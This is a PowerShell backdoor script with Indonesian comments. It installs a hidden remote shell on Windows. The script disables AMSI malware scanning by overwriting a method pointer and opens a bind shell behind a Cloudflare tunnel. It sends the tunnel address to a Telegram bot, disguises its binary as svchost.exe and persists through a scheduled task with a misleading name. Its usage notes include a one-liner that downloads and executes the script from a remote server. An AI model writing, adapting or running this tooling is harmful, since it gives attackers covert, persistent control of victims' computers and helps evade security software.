<#
.SYNOPSIS
    Cloudflare Tunnel Reverse Shell (seperti gsocket) + Telegram notifikasi (Windows PowerShell version)
.DESCRIPTION
    Script ini menginstall cloudflared tunnel dan bind shell di localhost, kemudian mengirimkan URL tunnel via Telegram.
    Mendukung uninstall dengan token.
.NOTES
    File ini harus dijalankan dengan PowerShell dengan ExecutionPolicy Bypass.
    Untuk menjalankan: powershell -NoProfile -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://your-server/dep.ps1')"
    Uninstall: $env:CF_UNINSTALL="<token>"; IEX (New-Object Net.WebClient).DownloadString('http://your-server/dep.ps1')
#>

# ========== TEKNIK BYPASS AMSI ==========
# Manipulasi pointer method ScanContent milik AMSI
class TrollAMSI {
    static [int] M([string]$c, [string]$s) { return 1 }
}

$o = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetMethods('NonPublic,Static') | Where-Object { $_.Name -eq 'ScanContent' }
$t = [TrollAMSI].GetMethods() | Where-Object { $_.Name -eq 'M' }

# Copy pointer dari method dummy ke method asli AMSI
[System.Runtime.InteropServices.Marshal]::Copy(
    @([System.Runtime.InteropServices.Marshal]::ReadIntPtr([long]$t.MethodHandle.Value + 8)),
    0,
    [long]$o.MethodHandle.Value + 8,
    1
)

# ========== KONFIGURASI ==========
$HOME = if ($env:HOME) { $env:HOME } else { $env:USERPROFILE }
$USER = $env:USERNAME
$UID = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value -replace '-', ''
$BIN_HIDDEN_NAME = "svchost.exe"
$CONFIG_DIR = ".config\dbus"
$URL_BASE = "https://github.com/cloudflare/cloudflared/releases/latest/download"
$TMPDIR = Join-Path $env:TEMP ".cf-$UID"
$PORT = Get-Random -Minimum 10000 -Maximum 50000
$PROC_HIDDEN_NAME = "[svchost.exe]"

# ========== TELEGRAM NOTIFICATION ==========
$TELEGRAM_BOT_TOKEN = ""   # Isi dengan token bot Anda
$TELEGRAM_CHAT_ID = ""     # Isi dengan chat ID Anda

New-Item -ItemType Directory -Path $TMPDIR -Force -ErrorAction SilentlyContinue | Out-Null

# ========== FUNGSI OUTPUT ==========
function Write-Step {
    param([string]$Text)
    Write-Host -NoNewline ("{0,-50}" -f $Text)
}

function Write-Ok {
    Write-Host "[OK]" -ForegroundColor Green
}

function Write-Skip {
    Write-Host "[SKIPPING]" -ForegroundColor Yellow
}

function Write-Failed {
    Write-Host "[FAILED]" -ForegroundColor Red
    exit 1
}

function Write-Error {
    param([string]$Message)
    Write-Host $Message -ForegroundColor Red -ErrorAction Continue
}

function Write-Info {
    param([string]$Message)
    Write-Host $Message -ForegroundColor Green
}

function Write-Warn {
    param([string]$Message)
    Write-Host $Message -ForegroundColor Yellow
}

# ========== KIRIM PESAN TELEGRAM ==========
function Send-Telegram {
    param([string]$Message)
    if ($TELEGRAM_BOT_TOKEN -and $TELEGRAM_BOT_TOKEN -ne "1234567890:ABCdefGHIjklMNOpqrsTUVwxyz" -and $TELEGRAM_CHAT_ID) {
        $body = @{
            chat_id = $TELEGRAM_CHAT_ID
            text = $Message
            parse_mode = "HTML"
        }
        try {
            Invoke-RestMethod -Uri "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage" -Method Post -Body $body -ErrorAction SilentlyContinue | Out-Null
        } catch { }
    }
}

# ========== DETEKSI ARSITEKTUR ==========
function Get-Architecture {
    $arch = if ([Environment]::Is64BitOperatingSystem) { "amd64" } else { "386" }
    # Cloudflared binary naming: cloudflared-windows-amd64.exe, cloudflared-windows-386.exe
    return "windows-$arch"
}

# ========== DOWNLOAD CLOUDFLARED ==========
function Download-Cloudflared {
    param([string]$Arch)
    $url = "$URL_BASE/cloudflared-$Arch.exe"
    $out = Join-Path $TMPDIR "cloudflared.exe"
    try {
        Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing -ErrorAction Stop | Out-Null
        return $out
    } catch {
        return $null
    }
}

# ========== BIND SHELL (LISTEN LOCALHOST) ==========
function Start-BindShell {
    param([int]$Port)
    $scriptBlock = {
        param($p)
        $listener = [System.Net.Sockets.TcpListener]::new('127.0.0.1', $p)
        $listener.Start()
        while ($true) {
            $client = $listener.AcceptTcpClient()
            $stream = $client.GetStream()
            $writer = New-Object System.IO.StreamWriter($stream)
            $reader = New-Object System.IO.StreamReader($stream)
            $writer.AutoFlush = $true
            $writer.WriteLine("PowerShell reverse shell connected")
            while ($client.Connected) {
                if ($stream.DataAvailable) {
                    $cmd = $reader.ReadLine()
                    if ($cmd -eq "exit") { break }
                    try {
                        $output = & powershell -NoProfile -Command $cmd 2>&1 | Out-String
                        $writer.WriteLine($output)
                    } catch {
                        $writer.WriteLine("Error: $_")
                    }
                }
                Start-Sleep -Milliseconds 100
            }
            $client.Close()
        }
    }
    $ps = Start-Process -NoNewWindow -PassThru -FilePath powershell.exe -ArgumentList "-NoProfile -Command `"$($scriptBlock.ToString()) $Port`""
    return $ps.Id
}

# ========== START TUNNEL ==========
function Start-Tunnel {
    param([int]$Port, [string]$BinaryPath)
    $logFile = Join-Path $TMPDIR "cloudflared.log"
    $arguments = "tunnel --url tcp://127.0.0.1:$Port"
    # Jalankan dengan nama proses yang disamarkan
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = $BinaryPath
    $psi.Arguments = $arguments
    $psi.RedirectStandardOutput = $true
    $psi.RedirectStandardError = $true
    $psi.UseShellExecute = $false
    $psi.CreateNoWindow = $true
    $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $p = [System.Diagnostics.Process]::Start($psi)
    # Redirect output ke file
    $p.OutputDataReceived += {
        param($sender, $e)
        if ($e.Data) {
            Add-Content -Path $logFile -Value $e.Data
            # Cek URL
            if ($e.Data -match 'https://([a-z0-9-]+)\.trycloudflare\.com') {
                $url = $matches[0]
                $urlFile = Join-Path $TMPDIR "url_sent"
                if (-not (Test-Path $urlFile) -or (Select-String -Path $urlFile -Pattern $url -Quiet -ErrorAction SilentlyContinue) -eq $false) {
                    Add-Content -Path $urlFile -Value $url
                    $msg = "<b>New Tunnel URL</b>`n$url`n`nUse: cloudflared access tcp --hostname $url --url localhost:4444 && nc localhost 4444"
                    Send-Telegram $msg
                }
            }
        }
    }
    $p.ErrorDataReceived += {
        param($sender, $e)
        if ($e.Data) { Add-Content -Path $logFile -Value $e.Data }
    }
    $p.BeginOutputReadLine()
    $p.BeginErrorReadLine()
    return $p.Id
}

# ========== PERSISTENCE SCRIPT ==========
function Create-PersistenceScript {
    param([string]$BinaryPath, [int]$Port, [string]$Token, [string]$ChatId)
    $scriptPath = Join-Path $HOME ".$CONFIG_DIR\cf_tunnel.ps1"
    New-Item -ItemType Directory -Path (Split-Path $scriptPath) -Force -ErrorAction SilentlyContinue | Out-Null
    $content = @"
# Persistence script for Cloudflare Tunnel
`$BinaryPath = "$BinaryPath"
`$Port = $Port
`$TMPDIR = "$TMPDIR"
`$Token = "$Token"
`$ChatId = "$ChatId"
`$PROC_HIDDEN_NAME = "$PROC_HIDDEN_NAME"

function Send-Telegram {
    param(`$Message)
    if (`$Token -and `$Token -ne "1234567890:ABCdefGHIjklMNOpqrsTUVwxyz" -and `$ChatId) {
        `$body = @{chat_id=`$ChatId; text=`$Message; parse_mode="HTML"}
        try { Invoke-RestMethod -Uri "https://api.telegram.org/bot`$Token/sendMessage" -Method Post -Body `$body -ErrorAction SilentlyContinue | Out-Null } catch {}
    }
}

while (`$true) {
    `$logFile = Join-Path `$TMPDIR "cloudflared.log"
    `$urlSentFile = Join-Path `$TMPDIR "url_sent"
    `$psi = New-Object System.Diagnostics.ProcessStartInfo
    `$psi.FileName = `$BinaryPath
    `$psi.Arguments = "tunnel --url tcp://127.0.0.1:`$Port"
    `$psi.RedirectStandardOutput = `$true
    `$psi.RedirectStandardError = `$true
    `$psi.UseShellExecute = `$false
    `$psi.CreateNoWindow = `$true
    `$psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    `$p = [System.Diagnostics.Process]::Start(`$psi)
    `$p.OutputDataReceived += {
        param(`$sender, `$e)
        if (`$e.Data) {
            Add-Content -Path `$logFile -Value `$e.Data
            if (`$e.Data -match 'https://([a-z0-9-]+)\.trycloudflare\.com') {
                `$url = `$matches[0]
                if (-not (Test-Path `$urlSentFile) -or (Select-String -Path `$urlSentFile -Pattern `$url -Quiet -ErrorAction SilentlyContinue) -eq `$false) {
                    Add-Content -Path `$urlSentFile -Value `$url
                    Send-Telegram "<b>New Tunnel URL</b>`n`$url"
                }
            }
        }
    }
    `$p.ErrorDataReceived += {
        param(`$sender, `$e)
        if (`$e.Data) { Add-Content -Path `$logFile -Value `$e.Data }
    }
    `$p.BeginOutputReadLine()
    `$p.BeginErrorReadLine()
    `$p.WaitForExit()
    Start-Sleep -Seconds 10
}
"@
    Set-Content -Path $scriptPath -Value $content -Encoding UTF8
    return $scriptPath
}

# ========== INSTALL PERSISTENCE (Task Scheduler) ==========
function Install-Persistence {
    param([string]$ScriptPath)
    $taskName = "System Logging Daemon"
    # Hapus task lama jika ada
    schtasks /Delete /TN $taskName /F 2>$null
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -File `"$ScriptPath`""
    $trigger = New-ScheduledTaskTrigger -AtStartup
    $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Highest
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 5)
    try {
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force -ErrorAction Stop | Out-Null
        return $true
    } catch {
        return $false
    }
}

# ========== DETEKSI INSTALASI SUDAH ADA ==========
function Check-ExistingInstallation {
    $tokenFile = Join-Path $HOME ".$CONFIG_DIR\.uninstall_token"
    if (Test-Path $tokenFile) {
        Write-Warn "Installation already detected. If you want to reinstall, first uninstall with the token."
        exit 1
    }
}

# ========== UNINSTALL ==========
function Uninstall {
    $tokenFile = Join-Path $HOME ".$CONFIG_DIR\.uninstall_token"
    if (-not (Test-Path $tokenFile)) {
        Write-Host "No installation found or token missing."
        exit 1
    }
    $storedToken = Get-Content $tokenFile -Raw
    if (-not $env:CF_UNINSTALL -or $env:CF_UNINSTALL -ne $storedToken) {
        Write-Host "Invalid uninstall token. Use `$env:CF_UNINSTALL=<token> and re-run this script."
        exit 1
    }
    Write-Step "Removing installed files..."
    # Hentikan proses
    $confFile = Join-Path $HOME ".$CONFIG_DIR\tunnel.conf"
    if (Test-Path $confFile) {
        $vars = Get-Content $confFile | ConvertFrom-StringData
        if ($vars.BIND_PID) { Stop-Process -Id $vars.BIND_PID -Force -ErrorAction SilentlyContinue }
        if ($vars.TUNNEL_PID) { Stop-Process -Id $vars.TUNNEL_PID -Force -ErrorAction SilentlyContinue }
    }
    Get-Process -Name "svchost" -ErrorAction SilentlyContinue | Where-Object { $_.StartInfo.FileName -like "*$BIN_HIDDEN_NAME*" } | Stop-Process -Force -ErrorAction SilentlyContinue
    # Hapus task scheduler
    schtasks /Delete /TN "System Logging Daemon" /F 2>$null
    # Hapus file
    Remove-Item -Path (Join-Path $HOME ".$CONFIG_DIR") -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item -Path $TMPDIR -Recurse -Force -ErrorAction SilentlyContinue
    Write-Ok
    Write-Host "--> Uninstall complete."
    exit 0
}

# ========== MAIN ==========
# Cek uninstall
if ($env:CF_UNINSTALL) { Uninstall }

# Cek instalasi yang sudah ada
Check-ExistingInstallation

# Bersihkan TMPDIR
Remove-Item -Path $TMPDIR -Recurse -Force -ErrorAction SilentlyContinue
New-Item -ItemType Directory -Path $TMPDIR -Force | Out-Null

# Step 1: Download binary
Write-Step "Downloading binaries..."
$arch = Get-Architecture
$cfBin = Download-Cloudflared $arch
if (-not $cfBin) { Write-Failed }
Write-Ok

# Step 2: Unpacking binaries (tidak perlu di Windows)
Write-Step "Unpacking binaries..."
Start-Sleep -Milliseconds 100
Write-Ok

# Step 3: Copy binary ke direktori persisten
Write-Step "Copying binaries..."
$INSTALL_DIR = Join-Path $HOME ".$CONFIG_DIR"
$useTmp = $false
if (-not (New-Item -ItemType Directory -Path $INSTALL_DIR -Force -ErrorAction SilentlyContinue)) {
    $useTmp = $true
} else {
    try {
        Copy-Item -Path $cfBin -Destination (Join-Path $INSTALL_DIR $BIN_HIDDEN_NAME) -Force -ErrorAction Stop
    } catch {
        $useTmp = $true
    }
}
if ($useTmp) {
    Write-Warn "Cannot use $INSTALL_DIR, using $env:TEMP instead"
    $INSTALL_DIR = Join-Path $env:TEMP ".$CONFIG_DIR-$UID"
    New-Item -ItemType Directory -Path $INSTALL_DIR -Force | Out-Null
    Copy-Item -Path $cfBin -Destination (Join-Path $INSTALL_DIR $BIN_HIDDEN_NAME) -Force
}
$cfBin = Join-Path $INSTALL_DIR $BIN_HIDDEN_NAME
Write-Ok

# Step 4: Testing binaries
Write-Step "Testing binaries..."
try { & $cfBin --version | Out-Null } catch { Write-Failed }
Write-Ok

# Step 5: Testing Global Socket Relay Network
Write-Step "Testing Global Socket Relay Network..."
try {
    $null = Invoke-WebRequest -Uri "https://cloudflare.com" -UseBasicParsing -TimeoutSec 5 -ErrorAction Stop
    Write-Ok
} catch {
    Write-Warn "No internet connectivity? Continuing anyway..."
    Write-Skip
}

# Step 6 & 7: Skip karena tidak relevan di Windows
Write-Step "Installing access via ~/.bashrc..."
Write-Skip
Write-Step "Installing access via ~/.profile..."
Write-Skip
Write-Step "Executing webhooks..."
Write-Skip

# Buat token uninstall
$UNINSTALL_TOKEN = -join ((48..57) + (97..122) | Get-Random -Count 16 | ForEach-Object { [char]$_ })
$tokenFile = Join-Path $INSTALL_DIR ".uninstall_token"
Set-Content -Path $tokenFile -Value $UNINSTALL_TOKEN -Encoding ASCII

Write-Host "--> To uninstall, use: `$env:CF_UNINSTALL='$UNINSTALL_TOKEN'; IEX (New-Object Net.WebClient).DownloadString('http://your-server/dep.ps1')"
Write-Host "--> To connect use one of the following:"
Write-Host "--> cloudflared access tcp --hostname <URL> --url localhost:4444 && nc localhost 4444"

# Step 9: Start hidden process
Write-Step "Starting 'defunct' as hidden process '$PROC_HIDDEN_NAME'..."
$bindPid = Start-BindShell -Port $PORT
$tunnelPid = Start-Tunnel -Port $PORT -BinaryPath $cfBin

# Simpan konfigurasi untuk uninstall
$confData = @"
BIND_PID=$bindPid
TUNNEL_PID=$tunnelPid
PORT=$PORT
"@
Set-Content -Path (Join-Path $INSTALL_DIR "tunnel.conf") -Value $confData

# Tunggu URL awal
Start-Sleep -Seconds 5

$logFile = Join-Path $TMPDIR "cloudflared.log"
if (Test-Path $logFile) {
    $url = Select-String -Path $logFile -Pattern 'https://[a-z0-9-]+\.trycloudflare\.com' | Select-Object -First 1
    if ($url) {
        $url = $url.Matches[0].Value
        Write-Host "`n$([char]0x1b)[32m✅ TUNNEL URL: $url$([char]0x1b)[0m"
        Write-Host "Connect with: cloudflared access tcp --hostname $url --url localhost:4444 && nc localhost 4444"
        Send-Telegram "<b>Initial Tunnel URL</b>`n$url"
    } else {
        Write-Warn "Tunnel URL not detected yet. Check $logFile"
    }
}
Write-Ok

# Persistence
if (-not $env:GS_NOINST) {
    $persistScript = Create-PersistenceScript -BinaryPath $cfBin -Port $PORT -Token $TELEGRAM_BOT_TOKEN -ChatId $TELEGRAM_CHAT_ID
    if (Install-Persistence $persistScript) {
        Write-Info "Persistence installed (will send new URLs via Telegram after reboot)."
    } else {
        Write-Warn "Persistence not installed (no Task Scheduler). Tunnel will not survive reboot."
    }
}

Write-Host "--> Join us on Telegram - https://t.me/thcorg"
Write-Info "Done. Use `$env:CF_UNINSTALL='$UNINSTALL_TOKEN' to uninstall."
